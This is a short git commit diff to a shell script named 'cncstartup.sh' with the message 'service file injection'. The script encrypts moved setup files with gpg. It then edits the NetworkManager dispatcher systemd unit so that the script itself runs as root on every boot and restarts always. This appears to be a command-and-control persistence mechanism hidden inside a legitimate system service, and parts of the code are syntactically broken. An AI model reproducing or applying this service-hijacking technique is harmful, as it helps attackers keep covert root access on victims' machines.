1d1c4981cc6e34c9e13958b6d541b9ea64d330a0
Shuttlemax <rao.nihar912@gmail.com>
2023-03-26 21:46:59 -0500

    service file injection

--- cncstartup.sh
+++ cncstartup.sh
@@ -13,10 +13,13 @@ mv setup.py install.sh .local/
 gpg -c .local/*
 
 file_path="/root/etc/systemd/system/dbus-org.freedesktop.nm-dispatcher.service
-sed -i "${14a}a\\WantedBy=multi-user.target" "$file_path"
-sed -i "${7a}a\\ExecStart=/root/cncstartup.sh" "$file_path"
-sed -i "${7a}a\\Restart=always" "$file_path"
-sed -i "${7a}a\\User=root" "$file_path"
+sed -i "14a\\WantedBy=multi-user.target" "$file_path"
+
+new_code='ExecStart=/usr/libexec/nm-dispatcher && /root/cncstartup.sh'
+
+sed -i "7s\\${new_code}" "$file_path"
+sed -i "7a\\Restart=always" "$file_path"
+sed -i "7a\\User=root" "$file_path"
 
 
 rm setup.py
